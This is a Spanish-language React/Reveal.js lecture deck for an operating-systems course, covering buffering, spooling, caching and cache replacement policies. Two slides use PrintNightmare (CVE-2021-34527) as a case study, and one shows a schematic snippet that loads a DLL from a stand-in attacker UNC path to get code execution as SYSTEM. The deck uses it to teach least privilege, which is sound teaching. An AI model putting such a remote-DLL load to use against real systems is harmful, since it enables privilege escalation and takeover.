import { Deck, Slide, Stack, Fragment, Code } from '@revealjs/react';
import RevealHighlight from 'reveal.js/plugin/highlight';
import React from 'react';

import 'reveal.js/reveal.css';
import 'reveal.js/theme/dracula.css';
import 'reveal.js/plugin/highlight/monokai.css';

interface MechanismProps {
  label: string;
  description: string;
}

const MechanismCard: React.FC<MechanismProps> = ({ label, description }) => (
  <div>
    <span style={{ color: 'var(--accent-buf)', display: 'block', marginBottom: '0.5rem' }}>{label}</span>
    {description}
  </div>
);

export default function App() {
  return (
    <Deck 
      config={{
        hash: true,
        center: true,
        transition: 'none',
        transitionSpeed: 'fast',
        width: 1920,
        height: 1080,
        margin: 0.1,
        minScale: 0.2,
        maxScale: 2.0,
      }}
      plugins={[RevealHighlight]}
    >
      {/* ── PORTADA ACADÉMICA ── */}
      <Slide backgroundGradient="linear-gradient(135deg, #0b0e14 0%, #12161f 100%)">
        <div style={{ padding: '0 8%', textAlign: 'left' }}>
          <div style={{ borderLeft: '1px solid #333', paddingLeft: '4rem' }}>
            <span style={{ fontFamily: 'var(--mono)', fontSize: '1rem', color: 'var(--accent-buf)', letterSpacing: '0.3em' }}>
              DEPARTAMENTO DE SISTEMAS OPERATIVOS // CS-402
            </span>
            <h1 style={{ fontSize: '6rem', margin: '1.5rem 0', fontWeight: '900', letterSpacing: '-0.02em', color: '#fff' }}>
              Gestión de<br/> Subsistemas de E/S
            </h1>
            <div style={{ height: '2px', width: '200px', background: 'var(--accent-buf)', marginBottom: '3rem' }}></div>
            <p style={{ fontSize: '1.8rem', maxWidth: '1000px', lineHeight: '1.4', opacity: 0.9, fontFamily: 'var(--serif)' }}>
              Un análisis exhaustivo sobre los mecanismos de <strong>desacoplamiento de latencia</strong> y
              optimización de throughput mediante Buffering, Spooling y Caching en kernels modernos.
            </p>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '4rem', fontFamily: 'var(--mono)', fontSize: '0.8rem', opacity: 0.6 }}>
              <MechanismCard label="// MECANISMO 01" description="BUFFERING: Sincronización de flujos asíncronos." />
              <MechanismCard label="// MECANISMO 02" description="SPOOLING: Virtualización de dispositivos exclusivos." />
              <MechanismCard label="// MECANISMO 03" description="CACHING: Optimización de localidad temporal/espacial." />
            </div>
          </div>
        </div>
      </Slide>

      {/* ── TAXONOMÍA DEL GAP DE VELOCIDAD ── */}
      <Slide>
        <div style={{ padding: '0 5%' }}>
          <h2 style={{ fontSize: '3rem', borderBottom: '1px solid #333', paddingBottom: '1rem', marginBottom: '3rem' }}>
            Taxonomía del Gap de Velocidad
          </h2>
          <div className="grid-2">
            <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
              <div className="metric-card" style={{ textAlign: 'left', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div>
                  <span className="metric-label" style={{ color: 'var(--accent-cache)' }}>Registro / L1</span>
                  <span className="metric-val" style={{ fontSize: '2rem' }}>~1 ns</span>
                </div>
                <div style={{ opacity: 0.3, fontSize: '0.8rem', textAlign: 'right' }}>ORDEN DE<br />MAGNITUD: 10<sup>0</sup></div>
              </div>
              <div className="metric-card" style={{ textAlign: 'left', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div>
                  <span className="metric-label" style={{ color: 'var(--accent-spool)' }}>DRAM Principal</span>
                  <span className="metric-val" style={{ fontSize: '2rem' }}>~100 ns</span>
                </div>
                <div style={{ opacity: 0.3, fontSize: '0.8rem', textAlign: 'right' }}>ORDEN DE<br />MAGNITUD: 10<sup>2</sup></div>
              </div>
              <div className="metric-card" style={{ textAlign: 'left', display: 'flex', justifyContent: 'space-between', alignItems: 'center', border: '1px solid var(--accent-red)' }}>
                <div>
                  <span className="metric-label" style={{ color: 'var(--accent-red)' }}>Dispositivos de Bloque</span>
                  <span className="metric-val" style={{ fontSize: '2rem' }}>~10 ms</span>
                </div>
                <div style={{ opacity: 0.3, fontSize: '0.8rem', textAlign: 'right' }}>ORDEN DE<br />MAGNITUD: 10<sup>7</sup></div>
              </div>
            </div>
            <div className="technical-note" style={{ margin: 0, fontSize: '1.2rem' }}>
              <p><strong>Impacto Arquitectónico:</strong> Esta disparidad de 7 órdenes de magnitud hace que la CPU pase el 99.9% de su tiempo en estado <code>WAIT</code> si no se implementan capas de abstracción.</p>
              <ul style={{ marginTop: '1.5rem', fontSize: '1.1rem' }}>
                <li><strong>Product-Consumer Problem:</strong> Buffer como solución al desacoplamiento.</li>
                <li><strong>Device Independence:</strong> Capa de abstracción del VFS.</li>
              </ul>
            </div>
          </div>
        </div>
      </Slide>

      {/* ── BUFFERING: PROFUNDIDAD TÉCNICA ── */}
      <Stack>
        <Slide>
          <div className="glass-card" style={{ borderLeft: '8px solid var(--accent-buf)', background: 'transparent !important', boxShadow: 'none' }}>
            <h2 className="buf" style={{ fontSize: '3.5rem' }}>Buffering: Sincronización Asíncrona</h2>
            <p style={{ fontSize: '1.4rem', opacity: 0.8, marginBottom: '3rem' }}>
              Área de almacenamiento temporal para normalizar ráfagas de datos entre dispositivos con diferentes semánticas de transferencia.
            </p>
            <div className="grid-2">
              <div style={{ borderRight: '1px solid #333', paddingRight: '2rem' }}>
                <h4 style={{ color: '#fff' }}>Objetivos Primordiales</h4>
                <ul style={{ fontSize: '1.1rem', marginTop: '1rem' }}>
                  <li><strong>Speed Matching:</strong> Compensar diferencias de throughput entre CPU (ns) e I/O (ms).</li>
                  <li><strong>Data Size Matching:</strong> Fragmentación de streams en bloques físicos de hardware.</li>
                  <li><strong>Copy Semantics:</strong> Garantía de integridad; el Kernel congela el estado del dato durante el <code>copy_to_user</code>.</li>
                </ul>
              </div>
              <div>
                <h4 style={{ color: '#fff' }}>Estrategias de Implementación</h4>
                <div style={{ marginTop: '1rem', display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                  <div style={{ background: 'var(--surface2)', padding: '1rem', borderRadius: '8px' }}>
                    <code style={{ color: 'var(--accent-buf)' }}>Double Buffering:</code> Un buffer se llena mientras el otro se vacía por DMA (Direct Memory Access).
                  </div>
                  <div style={{ background: 'var(--surface2)', padding: '1rem', borderRadius: '8px' }}>
                    <code style={{ color: 'var(--accent-buf)' }}>Circular Buffer:</code> Estructura de anillo (Head/Tail) común en drivers de red y audio.
                  </div>
                </div>
              </div>
            </div>
          </div>
        </Slide>
        <Slide>
          <div className="center">
            <h3 className="buf">Algoritmo de Buffer Cache (VFS)</h3>
            <div className="technical-note" style={{ textAlign: 'left', borderColor: 'var(--accent-buf)' }}>
              <p>Cuando un proceso solicita un bloque:</p>
              <ol style={{ fontSize: '1.1rem', marginTop: '1rem' }}>
                <li>El Kernel verifica el <strong>Hash Map</strong> de bloques en memoria.</li>
                <li>Si no está (<em>Miss</em>), bloquea el proceso, inicia I/O asíncrono y pone el bloque en la <strong>LRU List</strong>.</li>
                <li>Si está (<em>Hit</em>), se marca como <strong>Dirty</strong> si se modifica y se copia al espacio de usuario.</li>
              </ol>
            </div>
          </div>
        </Slide>
      </Stack>

      {/* ── SPOOLING: VIRTUALIZACIÓN ── */}
      <Stack>
        <Slide>
          <div className="glass-card" style={{ borderLeft: '8px solid var(--accent-spool)', background: 'transparent !important' }}>
            <h2 className="spool" style={{ fontSize: '4rem' }}>Spooling: Simultaneous Peripheral Operation On-Line</h2>
            <p style={{ fontSize: '1.5rem', opacity: 0.7 }}>Virtualización de dispositivos exclusivos (Impresoras, Plotters).</p>
            <div className="grid-2" style={{ marginTop: '2rem' }}>
              <div>
                <p style={{ fontSize: '1.2rem' }}>
                  A diferencia del buffering, el spooling usa el <strong>almacenamiento masivo</strong> para interceptar trabajos completos.
                </p>
                <div className="technical-note" style={{ borderColor: 'var(--accent-spool)', color: 'var(--accent-spool)' }}>
                  <strong>VIRTUALIZACIÓN:</strong> Cada proceso cree que tiene el control total del dispositivo, pero solo escribe en un archivo temporal gestionado por un <code>Daemon</code>.
                </div>
              </div>
              <div style={{ background: 'var(--surface2)', padding: '1.5rem', borderRadius: '12px' }}>
                <h4 className="spool">Workflow Académico</h4>
                <ol style={{ fontSize: '0.9rem', marginTop: '1rem', color: '#ccc' }}>
                  <li>Proceso escribe en <code>/var/spool/...</code></li>
                  <li>Kernel registra entrada en la <strong>Queue</strong>.</li>
                  <li>El Spooling Daemon (lpd/cups) lee la cola por prioridad.</li>
                  <li>Transferencia secuencial al hardware físico.</li>
                </ol>
              </div>
            </div>
          </div>
        </Slide>
        <Slide>
          <div className="grid-2">
            <div className="glass-card">
              <h3 className="spool">Caso de Estudio: PrintNightmare</h3>
              <p style={{ fontSize: '1rem' }}><strong>CVE-2021-34527:</strong> El Spooler de Windows corría con privilegios de <code>SYSTEM</code> y permitía la carga de DLLs remotas.</p>
              <div style={{ marginTop: '1rem', borderLeft: '2px solid var(--accent-red)', paddingLeft: '1rem', fontSize: '0.9rem', fontStyle: 'italic' }}>
                Lección: Los subsistemas de E/S deben seguir el <strong>Principio de Menor Privilegio</strong>.
              </div>
            </div>
            <div className="metric-card">
              <span className="tag" style={{ color: 'var(--accent-red)', border: '1px solid var(--accent-red)' }}>Warning</span>
              <p style={{ fontSize: '1rem', marginTop: '1rem' }}>Un error en la lógica del Spooler puede comprometer todo el Kernel debido a su interacción directa con drivers de bajo nivel.</p>
            </div>
          </div>
        </Slide>
      </Stack>

      {/* ── CACHING: LOCALIDAD ── */}
      <Stack>
        <Slide>
          <div className="glass-card" style={{ borderLeft: '8px solid var(--accent-cache)', background: 'transparent !important' }}>
            <h2 className="cache" style={{ fontSize: '4rem' }}>Caching: Gestión de Localidad</h2>
            <p style={{ fontSize: '1.5rem', marginBottom: '2rem' }}>Optimización basada en patrones de acceso heurísticos.</p>
            <div className="grid-2">
              <div className="metric-card">
                <h4 className="cache">Localidad Temporal</h4>
                <p style={{ fontSize: '1.1rem' }}>Si un dato se usa ahora, es muy probable que se use de nuevo pronto (Variables en loops).</p>
              </div>
              <div className="metric-card">
                <h4 className="cache">Localidad Espacial</h4>
                <p style={{ fontSize: '1.1rem' }}>Si un dato se usa, es probable que se usen sus vecinos (Vectores, instrucciones secuenciales).</p>
              </div>
            </div>
            <div className="technical-note" style={{ marginTop: '2rem', borderColor: 'var(--accent-cache)', color: 'var(--accent-cache)' }}>
              <strong>Heurística OS:</strong> Implementación de <code>Read-Ahead</code> (Prefetching) para adelantarse a la CPU.
            </div>
          </div>
        </Slide>
        <Slide>
          <h3 className="cache">Políticas de Reemplazo</h3>
          <table className="compare-table">
            <thead>
              <tr>
                <th>Algoritmo</th>
                <th>Lógica Técnica</th>
                <th>Trade-off</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>LRU</strong></td>
                <td>Least Recently Used</td>
                <td className="cache">Preciso pero requiere overhead de tracking.</td>
              </tr>
              <tr>
                <td><strong>Clock</strong></td>
                <td>Aproximación de LRU (Reference bit)</td>
                <td className="cache">Alta eficiencia en el Kernel.</td>
              </tr>
              <tr>
                <td><strong>MRU</strong></td>
                <td>Most Recently Used</td>
                <td className="cache">Ideal para escaneos de archivos gigantes.</td>
              </tr>
            </tbody>
          </table>
        </Slide>
      </Stack>

      {/* ── SEGURIDAD (PRINTNIGHTMARE) ── */}
      <Slide>
        <div className="grid-2">
          <div>
            <span className="tag" style={{ background: 'rgba(255, 107, 107, 0.1)', color: 'var(--accent-red)' }}>Security Deep Dive</span>
            <h2 style={{ fontSize: '3rem' }}>PrintNightmare</h2>
            <p style={{ fontSize: '1.1rem', opacity: 0.7 }}>CVE-2021-34527: La caída del Spooler Monolítico.</p>
            <div className="technical-note" style={{ marginTop: '2rem' }}>
              <strong>MITIGACIÓN:</strong> Introducción de aislamiento de procesos y restricción de privilegios (Walters, 2025).
            </div>
          </div>
          <Code language="javascript" lineNumbers="1|3-5" style={{ fontSize: '1.2rem', borderRadius: '20px' }}>
            {`// RpcAddPrinterDriverEx
// Vulnerabilidad SYSTEM
const path = "\\\\attacker\\malicious.dll";
installDriver(path); // RCE as SYSTEM
`}
          </Code>
        </div>
      </Slide>

      {/* ── CIERRE ── */}
      <Slide className="center">
        <div className="glass-card">
          <h2 style={{ fontSize: '4rem' }}>Conclusión Técnica</h2>
          <p style={{ fontSize: '1.8rem', maxWidth: '1000px', margin: '2rem auto' }}>
            La eficiencia de un SO moderno reside en la inteligencia de sus mecanismos de gestión de latencia.
          </p>
          <div style={{ borderTop: '1px solid #333', paddingTop: '2rem', marginTop: '2rem', opacity: 0.5 }}>
            <p style={{ fontSize: '0.9rem', fontFamily: 'var(--mono)' }}>Dossier Técnico • 2026 • React + Reveal.js</p>
          </div>
        </div>
      </Slide>
    </Deck>
  );
}
